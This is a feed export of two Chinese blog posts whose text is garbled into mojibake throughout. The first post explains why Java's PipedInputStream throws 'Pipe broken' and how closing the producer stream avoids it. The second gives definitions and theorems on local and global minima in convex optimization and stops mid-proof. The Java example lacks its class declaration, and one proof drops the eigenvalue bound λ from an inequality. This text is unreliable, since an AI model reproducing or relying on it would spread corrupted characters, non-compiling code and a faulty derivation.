0æ—¶ï¼Œæ‰§è¡Œåˆ°åˆ¤æ–­(writeSide != null) &amp;&amp; (!writeSide.isAlive()) &amp;&amp; (--trials &lt; 0)è¿™ä¸ªæ¡ä»¶æ—¶å°±ä¼šä¸ºtrueï¼ˆä¸‹å›¾çš„çº¢è‰²æµç¨‹ï¼‰<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>ç„¶åï¼ŒæŠ›å‡ºäº†ä¸€ä¸ªIOException(\"Pipe broken\")ï¼Œå› æ­¤ï¼Œå¯ä»¥å¾—å‡ºint trialså˜é‡çš„å«ä¹‰ï¼šè¿™ä¸ªå˜é‡æ˜¯ä¸€ä¸ªå¤šæ¬¡æ£€æµ‹çš„ç­–ç•¥å˜é‡ï¼Œå½“ç”Ÿäº§è€…çº¿ç¨‹æ²¡æœ‰å…³é—­äº†ä¸è¿™ä¸ª PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰ç›¸å…³è”çš„PipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰æ—¶ï¼Œå¹¶ä¸”writeSideå˜é‡æŒ‡å‘çš„å½“å‰ç”Ÿäº§è€…çº¿ç¨‹å·²ç»è¢«æ“ä½œç³»ç»Ÿå›æ”¶æ—¶ï¼ˆæ­¤æ—¶å½“å‰ç”Ÿäº§è€…çº¿ç¨‹å¯¹è±¡çš„isAlive()å‡½æ•°ä¼šè¿”å›falseï¼‰ï¼Œæ¶ˆè´¹è€…çº¿ç¨‹ä¼šæŠ›å‡º1ä¸ªIOException(\"Pipe broken\")ï¼Œå¹¶ç»“æŸwhileå¾ªç¯ï¼Œè¿›è€Œç»“æŸæ¶ˆè´¹è€…çº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸã€‚ä¹‹åï¼Œè¯¥çº¿ç¨‹å¯¹è±¡ä¹Ÿä¼šè¢«æ“ä½œç³»ç»Ÿå›æ”¶ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<h6 id=\"322æ€æ ·é˜²æ­¢321ä¸­ç¬¬æ­¥çš„ç”Ÿäº§è€…çº¿ç¨‹æŠ›å‡ºioexceptionpipe-broken\">3.2.2ã€æ€æ ·é˜²æ­¢3.2.1ä¸­ç¬¬â‘¨æ­¥çš„ç”Ÿäº§è€…çº¿ç¨‹æŠ›å‡ºIOException(\"Pipe broken\")</h6>\n<p>â€ƒâ€ƒå›é¡¾3.2.1ä¸­ç¬¬â‘¨æ­¥ä¸­çš„æ¶ˆè´¹è€…çº¿ç¨‹æŠ›å‡ºIOException(\"Pipe broken\")çš„äº§ç”Ÿè¿‡ç¨‹ï¼šå½“æ‰§è¡Œåˆ°åˆ¤æ–­(writeSide != null) &amp;&amp; (!writeSide.isAlive()) &amp;&amp; (--trials &lt; 0)è¿™ä¸ªæ¡ä»¶æ—¶å°±ä¼šä¸ºtrueï¼ˆä¸‹å›¾çš„çº¢è‰²æµç¨‹ï¼‰<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>é‚£ä¹ˆï¼Œä½¿ç”¨è€…å°±å¯ä»¥å°†ä¸Šå›¾ä¸­çº¢è‰²æµç¨‹çš„å‰ä¸€æ­¥å˜æˆtrueå³å¯ï¼Œå¦‚ä¸‹ä»£ç æ‰€ç¤ºï¼ˆåªä¿®æ”¹äº†ç”Ÿäº§è€…çº¿ç¨‹ä¸­çš„ä»£ç ï¼Œæ¶ˆè´¹è€…çº¿ç¨‹ä¸­çš„ä»£ç æ²¡æœ‰å˜åŒ–ï¼‰ï¼š</p>\n<pre><code>package com.chelong.pipe;\nimport java.io.IOException;\nimport java.io.PipedInputStream;\nimport java.io.PipedOutputStream;\n   public static void main(String[] args) throws IOException, InterruptedException {\n      final PipedOutputStream output = new PipedOutputStream();\n      final PipedInputStream input = new PipedInputStream(output);\n      //ç”Ÿäº§è€…çº¿ç¨‹\n      Thread producer = new Thread(new Runnable() {\n         @Override\n         public void run() {\n            try {\n               for (int i = 0; i &lt; 3; i++) {\n                  synchronized (input) {\n//                    input.wait();\n                     output.write(\"Hello world, pipe!\".getBytes());\n                     input.wait();//é‡Šæ”¾é”å¹¶æ— é™ç­‰å¾…ï¼Œç›´åˆ°æ¶ˆè´¹è€…çº¿ç¨‹thread2æ‰§è¡ŒnotifyAll()å‡½æ•°æ¥å”¤é†’å½“å‰é˜»å¡\n                  }\n               }\n            } catch (Exception e) {\n               e.printStackTrace();\n            } finally {\n               try {\n                  if (output != null) output.close();//è°ƒç”¨close()å‡½æ•°å…³é—­ç”Ÿäº§è€…å¯¹è±¡\n               } catch (IOException e) {\n                  e.printStackTrace();\n               }\n            }\n         }\n      }, \"ç”Ÿäº§è€…çº¿ç¨‹\");\n\n      //æ¶ˆè´¹è€…çº¿ç¨‹\n      Thread consumer = new Thread(new Runnable() {\n         @Override\n         public void run() {\n            try {\n               byte[] b = new byte[1024];//1KB\n               int readBytes = -1;\n               long lastTime = System.currentTimeMillis();\n               while ((readBytes = input.read(b, 0, b.length)) != -1) {\n                  long curTime = System.currentTimeMillis();\n                  System.out.print(Thread.currentThread().getName() + \"æœ¬æ¬¡è¯»å–èŠ±è´¹æ—¶é—´ï¼š\" + (curTime - lastTime) + \"msï¼Œè¯»åˆ°çš„æ•°æ®æ˜¯ï¼š\");\n                  lastTime = curTime;\n                  for (int i = 0; i &lt; readBytes; i++) {\n                     System.out.print((char) b[i]);//æ¨¡æ‹Ÿå¤„ç†å­—èŠ‚æ•°æ®\n                  }\n                  System.out.println();\n               }\n            } catch (IOException e) {\n               e.printStackTrace();\n            }\n         }\n      }, \"æ¶ˆè´¹è€…çº¿ç¨‹\");\n      producer.start();//ç”Ÿäº§è€…çº¿ç¨‹å¯åŠ¨\n      consumer.start();//æ¶ˆè´¹è€…çº¿ç¨‹å¯åŠ¨\n   }\n}\n</code></pre>\n<p>ç¨‹åºè¿è¡Œç»“æœï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>â€ƒâ€ƒé€šè¿‡PipedOutputStream.class::close()çš„æºç å¯ä»¥çœ‹åˆ°è¿™æ ·ä¿®æ”¹åæ¶ˆè´¹è€…çº¿ç¨‹ä¸å†æŠ›å‡ºIOException(\"Pipe broken\")åŸå› ï¼š<br />\nPipedOutputStream.classï¼ˆç”Ÿäº§è€…ç±»ï¼‰çš„æºç </p>\n<pre><code>package java.io;\n\nimport java.io.*;\n\npublic\nclass PipedOutputStream extends OutputStream {\n    ...çœç•¥éƒ¨åˆ†ä»£ç ...\n    //å…³é—­è¿™ä¸ªPipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰ï¼Œè¿™ä¸ªPipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰ä¸èƒ½å†å‘ä¸å®ƒç›¸å…³è”çš„PipedInputStreamï¼ˆæ¶ˆè´¹è€…ï¼‰ä¸­çš„ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰å†™å…¥å­—èŠ‚æ•°æ®\n    public void close()  throws IOException {\n        if (sink != null) {\n            sink.receivedLast();//è°ƒç”¨PipedInputStream.class::receivedLast()å‡½æ•°\n        }\n    }\n}\n</code></pre>\n<p>PipedInputStream .classï¼ˆæ¶ˆè´¹è€…ç±»ï¼‰çš„æºç </p>\n<pre><code>package java.io;\n\npublic class PipedInputStream extends InputStream {\n    //æ ‡è®°ç¬¦ï¼štrueè¡¨ç¤ºä¸è¿™ä¸ª PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰ç›¸å…³è”çš„PipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰å·²ç»å…³é—­ï¼Œåä¹‹ï¼Œåä¹‹\n    boolean closedByWriter = false;\n    ...çœç•¥éƒ¨åˆ†ä»£ç ...\n    //å…³é—­ä¸è¿™ä¸ª PipedInputStream ï¼ˆæ¶ˆè´¹è€…ï¼‰ç›¸å…³è”çš„PipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰\n    synchronized void receivedLast() {\n        closedByWriter = true;//å…³é—­åæ¶ˆè´¹è€…å†ä»ç¼“å†²åŒºï¼ˆbyte[]ï¼‰æ•°ç»„ä¸­è¯»å–å­—èŠ‚æ•°æ®æ—¶ï¼Œä¼šè¿”å›-1ï¼Œä¸ä¼šæŠ›å‡ºIOExceptionäº†\n        notifyAll();//å”¤é†’æ‰€æœ‰æ¶ˆè´¹è€…çº¿ç¨‹\n    }\n    ...çœç•¥éƒ¨åˆ†ä»£ç ...\n</code></pre>\n<h4 id=\"å››å¤šä¸ªçº¿ç¨‹å‘pipedoutputstreamç”Ÿäº§è€…å†™å­—èŠ‚æ•°æ®å¤šä¸ªçº¿ç¨‹ä»pipedinputstreamæ¶ˆè´¹è€…è¯»å–å­—èŠ‚æ•°æ®çš„è¿‡ç¨‹\">å››ã€å¤šä¸ªçº¿ç¨‹å‘PipedOutputStreamï¼ˆç”Ÿäº§è€…ï¼‰å†™å­—èŠ‚æ•°æ®ï¼Œå¤šä¸ªçº¿ç¨‹ä»PipedInputStreamï¼ˆæ¶ˆè´¹è€…ï¼‰è¯»å–å­—èŠ‚æ•°æ®çš„è¿‡ç¨‹</h4>\n<p>â€ƒâ€ƒç•¥ï¼ˆå¾…è¡¥å……ï¼‰</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-19 22:07</span>&nbsp;\n<a href=\"https://www.cnblogs.com/Carey-ccl\">Carey_ccl</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">2</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "å‡¸ä¼˜åŒ–æ•°å­¦åŸºç¡€ç¬”è®°ï¼ˆäº”ï¼‰ï¼šæå°å€¼ç‚¹çš„åˆ¤å®šæ¡ä»¶",
      "link": "https://www.cnblogs.com/GeophysicsWorker/p/19625407",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/GeophysicsWorker/p/19625407\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-02-19 22:06\">\n    <span>å‡¸ä¼˜åŒ–æ•°å­¦åŸºç¡€ç¬”è®°ï¼ˆäº”ï¼‰ï¼šæå°å€¼ç‚¹çš„åˆ¤å®šæ¡ä»¶</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        å‡½æ•°f(X)åœ¨å±€éƒ¨æå°å€¼ç‚¹åº”æ»¡è¶³ä»€ä¹ˆæ¡ä»¶ï¼Ÿåä¹‹ï¼Œæ»¡è¶³ä»€ä¹ˆæ¡ä»¶çš„æ˜¯å±€éƒ¨æå°ç‚¹?è¿™å°±æ˜¯å‡¸ä¼˜åŒ–çš„åŸºæœ¬é—®é¢˜ã€‚ä¸‹é¢é’ˆå¯¹å¤šå…ƒå‡½æ•°çš„æƒ…å½¢ç»™å‡ºå„ç±»æå°å€¼ç‚¹çš„å®šä¹‰ã€‚\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>â€‹\tå‡½æ•°<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> åœ¨å±€éƒ¨æå°å€¼ç‚¹åº”æ»¡è¶³ä»€ä¹ˆæ¡ä»¶ï¼Ÿåä¹‹ï¼Œæ»¡è¶³ä»€ä¹ˆæ¡ä»¶çš„æ˜¯å±€éƒ¨æå°ç‚¹?è¿™å°±æ˜¯å‡¸ä¼˜åŒ–çš„åŸºæœ¬é—®é¢˜ã€‚ä¸‹é¢é’ˆå¯¹å¤šå…ƒå‡½æ•°çš„æƒ…å½¢ç»™å‡ºå„ç±»æå°å€¼ç‚¹çš„å®šä¹‰ã€‚</p>\n<p>â€‹\t<strong>å®šä¹‰ 5.1</strong> å¯¹äºä»»æ„ç»™å®šçš„å®æ•°<span class=\"math inline\">\\(\\forall \\delta&gt;0\\)</span>ï¼Œæ»¡è¶³ä¸ç­‰å¼ <span class=\"math inline\">\\(||\\mathbf{X}-\\mathbf{X}_0||&lt;\\delta\\)</span> ï¼ˆ<span class=\"math inline\">\\(\\mathbf{X,X_0}\\in\\mathbf{R}^{n}\\)</span>ï¼‰çš„é›†åˆç§°ä¸ºç‚¹ <span class=\"math inline\">\\(\\mathbf{X}_0\\)</span> çš„é¢†åŸŸï¼Œè®°ä¸ºï¼š</p>\n<p></p><div class=\"math display\">\\[N(\\mathbf{X}_0,\\delta)=\\{\\mathbf{X}|\\space||\\mathbf{X}-\\mathbf{X}_0||&lt;\\delta,\\delta&gt;0\\} \\tag{1}\n\\]</div><p></p><p>â€‹\t<strong>å®šä¹‰ 5.2</strong> è®¾ <span class=\"math inline\">\\(f:\\mathbf{D}\\subseteq\\mathbf{R}^n\\rightarrow\\mathbf{R}\\)</span>ï¼Œè‹¥å­˜åœ¨ç‚¹<span class=\"math inline\">\\(\\mathbf{X}^{*}\\in\\mathbf{D}\\)</span> å’Œæ­£æ•°<span class=\"math inline\">\\(\\delta&gt;0\\)</span>ï¼Œ<span class=\"math inline\">\\(\\forall \\mathbf{X}\\in{N(\\mathbf{X}^{*},\\delta)}\\cap\\mathbf{D}\\)</span> éƒ½æœ‰<span class=\"math inline\">\\(f(\\mathbf{X}^*)\\leq f(\\mathbf{X})\\)</span> ï¼Œåˆ™ç§°<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> ä¸º<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> å±€éƒ¨æå°å€¼ç‚¹ï¼ˆéä¸¥æ ¼ï¼‰ã€‚</p>\n<p>â€‹\t<strong>å®šä¹‰5.3</strong>  è®¾ <span class=\"math inline\">\\(f:\\mathbf{D} \\subseteq{\\mathbf{R}^n}\\rightarrow{\\mathbf{R}}\\)</span> ï¼Œè‹¥å­˜åœ¨ç‚¹<span class=\"math inline\">\\(\\mathbf{X}^{*}\\in{\\mathbf{D}}\\)</span>å’Œæ­£æ•°<span class=\"math inline\">\\(\\delta&gt;0\\)</span>ï¼Œ<span class=\"math inline\">\\(\\forall {\\mathbf{X}}\\in{N(\\mathbf{X}^{*},\\delta)}\\cap\\mathbf{D}\\)</span> ä¸” <span class=\"math inline\">\\(\\mathbf{X}\\neq{\\mathbf{X}^{*}}\\)</span> ï¼Œéƒ½æœ‰<span class=\"math inline\">\\(f(\\mathbf{X}^{*})&lt;f(\\mathbf{X})\\)</span> ï¼Œåˆ™ç§°<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> ä¸º<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> åœ¨ç‚¹<span class=\"math inline\">\\(\\mathbf{D}\\)</span> çš„ä¸¥æ ¼å±€éƒ¨æå°å€¼ç‚¹ã€‚</p>\n<p>â€‹\t<strong>å®šä¹‰5.4</strong> è®¾<span class=\"math inline\">\\(f:\\mathbf{D}\\subseteq{\\mathbf{R}^n}\\rightarrow\\mathbf{R}^1\\)</span>ï¼Œè‹¥å­˜åœ¨ç‚¹<span class=\"math inline\">\\(\\mathbf{X}^{*}\\in{\\mathbf{D}},\\forall \\mathbf{X}\\in{\\mathbf{D}}\\)</span> éƒ½æœ‰<span class=\"math inline\">\\(f(\\mathbf{X}^{*})&lt;f(\\mathbf{X})\\)</span> ï¼Œåˆ™ç§°<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> ä¸º<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> åœ¨<span class=\"math inline\">\\(\\mathbf{D}\\)</span> ä¸Šçš„å…¨å±€æå°å€¼ï¼ˆéä¸¥æ ¼ï¼‰ã€‚</p>\n<p>â€‹\t<strong>å®šä¹‰5.5</strong> è®¾<span class=\"math inline\">\\(f:\\mathbf{D}\\subseteq{\\mathbf{R}^n\\rightarrow{\\mathbf{R}^1}}\\)</span> ï¼Œè‹¥å­˜åœ¨ç‚¹ <span class=\"math inline\">\\(\\mathbf{X}^{*}\\in{\\mathbf{D}}\\)</span> ï¼Œ<span class=\"math inline\">\\(\\forall \\mathbf{X}\\in{\\mathbf{D}}\\)</span> ä½† <span class=\"math inline\">\\(\\mathbf{X}\\neq \\mathbf{X}^*\\)</span> ,éƒ½æœ‰<span class=\"math inline\">\\(f(\\mathbf{X}^{*})&lt;f(\\mathbf{X})\\)</span> ï¼Œåˆ™ç§°<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> ä¸º<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> åœ¨<span class=\"math inline\">\\(\\mathbf{D}\\)</span> ä¸Šçš„ä¸¥æ ¼å…¨å±€æå°å€¼ç‚¹ã€‚</p>\n<p>â€‹\tç”±äºä»¥ä¸Šå®šä¹‰çœ‹åˆ°ï¼Œ<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> æ˜¯<strong>å±€éƒ¨æå°å€¼ç‚¹</strong>ï¼Œæ˜¯æŒ‡åœ¨ä»¥ä¸‹<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> ä¸ºä¸­å¿ƒçš„ä¸€ä¸ªé¢†åŸŸä¸­<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> åœ¨ç‚¹<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> å¤„å–å¾—æœ€å°çš„å€¼ï¼›è€Œ<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> æ˜¯<strong>å…¨å±€æå°å€¼ç‚¹</strong>ï¼Œæ˜¯æŒ‡åœ¨å®šä¹‰åŸŸ<span class=\"math inline\">\\(\\mathbf{D}\\)</span> ä¸­<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> åœ¨ç‚¹<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> å¤„å–å¾—æœ€å°çš„å€¼ã€‚å…¨å±€æå°å€¼ç‚¹å¯èƒ½åœ¨æŸä¸ªå±€éƒ¨æå°å€¼ç‚¹ï¼Œä¹Ÿå¯èƒ½åœ¨<span class=\"math inline\">\\(\\mathbf{D}\\)</span> çš„è¾¹ç•Œä¸Šå–å¾—ã€‚</p>\n<p>â€‹        ç”±æ­¤ï¼Œå®é™…é—®é¢˜ä¸Šé€šå¸¸æ˜¯æ±‚å–å…¨å±€æå°å€¼ç‚¹ï¼Œä½†åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæœ€ä¼˜åŒ–ä¸­ç»å¤§å¤šæ•°æ–¹æ³•éƒ½æ˜¯æ±‚å±€éƒ¨æå°å€¼ç‚¹çš„ï¼Œè§£å†³è¿™ä¸€çŸ›ç›¾çš„ä¸€ç§æ–¹æ³•æ˜¯æ±‚å‡ºæ‰€æœ‰çš„å±€éƒ¨æå°å€¼ç‚¹ï¼Œå†æ±‚å‡ºå…¨å±€æå°å€¼ç‚¹ã€‚</p>\n<p>â€‹\t<strong>å®š ç† 5.1</strong> è®¾<span class=\"math inline\">\\(f:\\mathbf{D}\\subseteq {\\mathbf{R}^n}\\rightarrow\\mathbf{R}^1\\)</span> å…·æœ‰è¿ç»­çš„ä¸€é˜¶åå¯¼æ•°ã€‚è‹¥<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> æ˜¯<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> çš„å±€éƒ¨æå°å€¼ç‚¹å¹¶ä¸”æ˜¯<span class=\"math inline\">\\(\\mathbf{D}\\)</span> çš„å†…ç‚¹ï¼Œåˆ™</p>\n<p></p><div class=\"math display\">\\[\\nabla{f(\\mathbf{X}^{*})}=\\mathbf{0}_{n\\times{1}} \\tag{2}\n\\]</div><p></p><p><strong>è¯ æ˜</strong>ï¼šè®¾<span class=\"math inline\">\\(\\mathbf{e}\\)</span> æ˜¯ä»»æ„å•ä½å‘é‡ï¼Œç”±äº<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span>æ˜¯<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> çš„å±€éƒ¨æå°å€¼ç‚¹ï¼Œæ‰€ä»¥å­˜åœ¨<span class=\"math inline\">\\(\\delta&gt;0\\)</span>ï¼Œå½“<span class=\"math inline\">\\(|t|&lt;\\delta\\)</span>æˆ–<span class=\"math inline\">\\(\\mathbf{X}^{*}+t\\mathbf{e}\\in{N(\\mathbf{X}^{*},\\delta)}\\)</span> æ—¶æ€»æœ‰</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X}^{*}+t\\mathbf{e})\\geq f(\\mathbf{X}^{*}) \\tag{3}\n\\]</div><p></p><p>å¼•å…¥è¾…åŠ©ä¸€å…ƒå‡½æ•°<span class=\"math inline\">\\(\\phi(t)=f(\\mathbf{X}^*+t\\mathbf{e})\\)</span>ï¼Œæ­¤æ—¶ï¼Œç”±å¼ï¼ˆ3ï¼‰å¯å¾—ï¼Œ<span class=\"math inline\">\\(\\phi(t)\\geq\\phi(0)\\)</span>ã€‚ ç”±äº<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> æ˜¯<span class=\"math inline\">\\(\\mathbf{D}\\)</span> çš„å†…ç‚¹ï¼Œæ‰€ä»¥ä¸å®ƒå¯¹åº”çš„<span class=\"math inline\">\\(t=0\\)</span>æ˜¯<span class=\"math inline\">\\(\\phi(t)\\)</span> çš„å±€éƒ¨æå°å€¼ç‚¹ã€‚åˆæ ¹æ®ä¸€å…ƒå‡½æ•°æå°å€¼ç‚¹çš„å¿…è¦æ¡ä»¶ï¼Œå¾—åˆ°<span class=\"math inline\">\\(\\phi^{\\prime}(t)=0\\)</span> å³åˆ©ç”¨æ¢¯åº¦æ€§è´¨å¾—åˆ°<span class=\"math inline\">\\(\\nabla{f(\\mathbf{X})}^T\\mathbf{e}=0\\)</span>ã€‚å†ç”±å•ä½å‘é‡<span class=\"math inline\">\\(\\mathbf{e}\\)</span> çš„ä»»æ„æ€§å¯å¾—ï¼Œ<span class=\"math inline\">\\(\\nabla{f(\\mathbf{X}^{*})}=\\mathbf{0}\\)</span>ã€‚</p>\n<p>â€‹\tè¿™é‡Œå¼ï¼ˆ2ï¼‰ä»…ä»…æ˜¯<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> æ˜¯<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> çš„å±€éƒ¨æå°å€¼ç‚¹çš„å¿…è¦æ¡ä»¶ï¼Œè€Œä¸æ˜¯å……åˆ†æ¡ä»¶ï¼Œä¾‹å¦‚ <span class=\"math inline\">\\(f(x_1,x_2)=x_1x_2\\)</span> åœ¨ç‚¹<span class=\"math inline\">\\(\\mathbf{X}^{*}=[0,0]^T\\)</span> å¤„çš„æ¢¯åº¦ä¸º<span class=\"math inline\">\\(\\nabla{f(\\mathbf{X}^*)}=[0,0]^T\\)</span>, ä½†æ˜¯<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> æ˜¯<strong>åŒæ›²é¢çš„éç‚¹</strong>ï¼Œè€Œä¸æ˜¯æå°å€¼ç‚¹ã€‚</p>\n<p>â€‹\t<strong>å®š ä¹‰5.6</strong>  è®¾<span class=\"math inline\">\\(f:\\mathbf{D}\\subseteq{\\mathbf{R}^{n}}\\rightarrow\\mathbf{R}^{1}\\)</span> å…·æœ‰è¿ç»­äºŒé˜¶åå¯¼æ•°ï¼Œ<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> æ˜¯<span class=\"math inline\">\\(\\mathbf{D}\\)</span> çš„ä¸€ä¸ªå†…ç‚¹ï¼Œè‹¥<span class=\"math inline\">\\(\\nabla{f(\\mathbf{X^*})}=0\\)</span>ï¼Œåˆ™ç§°<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> ä¸º<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> <strong>é©»ç‚¹</strong>ã€‚</p>\n<p>â€‹\t<strong>å®š ç† 5.2</strong>  è®¾<span class=\"math inline\">\\(f:\\mathbf{D}\\subseteq{\\mathbf{R}^n\\rightarrow{\\mathbf{R^{1}}}}\\)</span> å…·æœ‰è¿ç»­äºŒé˜¶åå¯¼æ•°ï¼Œ<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> æ˜¯<span class=\"math inline\">\\(\\mathbf{D}\\)</span> çš„ä¸€ä¸ªå†…ç‚¹ï¼Œè‹¥<span class=\"math inline\">\\(\\nabla{f(\\mathbf{X}^{*})}=0\\)</span> ,å¹¶ä¸”<span class=\"math inline\">\\(\\nabla^2f(\\mathbf{X}^{*})\\)</span>æ˜¯æ­£å®šçš„ï¼Œåˆ™<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> æ˜¯<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> çš„ä¸¥æ ¼æå°å€¼ç‚¹ã€‚</p>\n<p><strong>è¯ æ˜ï¼š</strong> å› ä¸º<span class=\"math inline\">\\(\\nabla^2f(\\mathbf{X}^*)\\)</span> æ˜¯æ­£å®šçŸ©é˜µï¼Œåˆ™å¿…å­˜åœ¨<span class=\"math inline\">\\(\\lambda&gt;0\\)</span>,ä½¿å¾—å¯¹äºæ‰€æœ‰<span class=\"math inline\">\\(\\mathbf{P}\\in\\mathbf{R}^n\\)</span>éƒ½æœ‰</p>\n<p></p><div class=\"math display\">\\[\\mathbf{P}^T\\nabla^2f(\\mathbf{X}^{*})\\mathbf{P}&gt;\\lambda||\\mathbf{P}||^2 \\tag{4}\n\\]</div><p></p><p>(å…¶å‚çœ‹é«˜ç­‰ä»£æ•°äºŒæ¬¡å‹ç†è®º)ã€‚ç°åœ¨å°†<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span>åœ¨ç‚¹<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> å¤„æŒ‰ç…§Taylor å±•å¼€çš„ï¼Œå¹¶æ³¨æ„åˆ°<span class=\"math inline\">\\(\\nabla f(\\mathbf{X}^*)=0\\)</span>, äºæ˜¯å¯å¾—ï¼š</p>\n<p></p><div class=\"math display\">\\[\\begin{aligned}\nf(\\mathbf{X})-f(\\mathbf{X}^{*})&amp;=\\frac{1}{2}(\\mathbf{X}-\\mathbf{X^*})^T\\nabla^2f(\\mathbf{X}^*)(\\mathbf{X}-\\mathbf{X}^{*})+o(||\\mathbf{X}-\\mathbf{X}^{*}||^2)\\\\\n&amp;\\geq \\frac{1}{2}||\\mathbf{X}-\\mathbf{X}^{*}||^2+o(||\\mathbf{X}-\\mathbf{X}^{*}||^2)\n\\end{aligned}\n\\tag{5}\n\\]</div><p></p><p>å½“å…¶<span class=\"math inline\">\\(\\mathbf{X}\\)</span> å……åˆ†æ¥è¿‘<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> ï¼ˆä½†<span class=\"math inline\">\\(\\mathbf{X}\\neq \\mathbf{X}^{*}\\)</span>ï¼‰ æ—¶ï¼Œä¸Šå¼å·¦ç«¯çš„ç¬¦å·å–å†³äºå³ç«¯çš„ç¬¬ä¸€é¡¹ï¼Œå› æ­¤ï¼Œ<span class=\"math inline\">\\(f(\\mathbf{X})&gt;f(\\mathbf{X}^{*})\\)</span> ã€‚</p>\n<p>â€‹\tä¸€èˆ¬æ¥è¯´ï¼Œè¿™ä¸ªå®šç†å…·å¤‡ç†è®ºæ„ä¹‰ã€‚å› ä¸ºå¯¹äºå¤æ‚çš„ç›®æ ‡å‡½æ•°ï¼ŒHessiançŸ©é˜µä¸æ˜“æ±‚å¾—ï¼Œå®ƒçš„æ­£å®šæ€§å°±æ›´éš¾åˆ¤å®šäº†ã€‚</p>\n<p>â€‹\t<strong>å®šç† 5.3</strong> è‹¥å¤šå…ƒå‡½æ•°åœ¨å…¶æå°ç‚¹å¤„çš„<span class=\"math inline\">\\(Hessian\\)</span> çŸ©é˜µæ˜¯æ­£å®šçš„ï¼Œåˆ™å®ƒåœ¨è¿™ä¸ªç‚¹é™„è¿‘çš„ç­‰å€¼é¢è¿‘ä¼¼åœ°å‘ˆç°ä¸ºåŒå¿ƒæ¤­çƒé¢ç°‡ã€‚</p>\n<p><strong>è¯ æ˜ï¼š</strong>è®¾<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> æ˜¯å¤šå…ƒå‡½æ•°çš„æå°ç‚¹ï¼Œå¹¶è®¾<span class=\"math inline\">\\(f(\\mathbf{X})=\\gamma\\)</span> æ˜¯å……åˆ†é è¿‘æå°ç‚¹<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> çš„ä¸€ä¸ªç­‰å€¼é¢ï¼Œå³<span class=\"math inline\">\\(||\\mathbf{X}-\\mathbf{X}^{*}||\\)</span>å……åˆ†å°ã€‚æŠŠ<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> åœ¨<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> ç‚¹å±•å¼€Taylorè¡¨è¾¾å¼ï¼Œå³</p>\n<p></p><div class=\"math display\">\\[\\begin{aligned}\nf(\\mathbf{X})=f(\\mathbf{X}^{*})+\\nabla{f(\\mathbf{X}^{*})^{T}}(\\mathbf{X}-\\mathbf{X}^{*})+\\frac{1}{2}(\\mathbf{X}-\\mathbf{X}^{*})^T\\nabla^2f(\\mathbf{X}^*)(\\mathbf{X}-\\mathbf{X}^{*})+o(||\\mathbf{X}-\\mathbf{X}^*||^2)   \n\\end{aligned}\n\\tag{6}\n\\]</div><p></p><p>å³ç«¯ç¬¬äºŒé¡¹å› <span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 